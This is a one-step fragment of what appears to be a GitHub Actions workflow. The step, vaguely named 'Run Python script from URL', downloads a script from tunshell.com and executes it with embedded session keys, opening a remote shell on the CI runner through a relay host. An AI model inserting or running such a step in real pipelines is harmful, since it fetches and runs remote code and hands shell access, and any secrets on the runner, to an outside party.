    - name: Run Python script from URL
      run: |
        python -c "import urllib.request; r = urllib.request.urlopen('https://lets.tunshell.com/init.py'); exec(r.read().decode('utf-8'), {'p': ['T', 'yuWydM918Ci7jfLjciBfHj', 'klkl8AxpQ80N2uWwV5p7ME', 'eu.relay.tunshell.com']})"
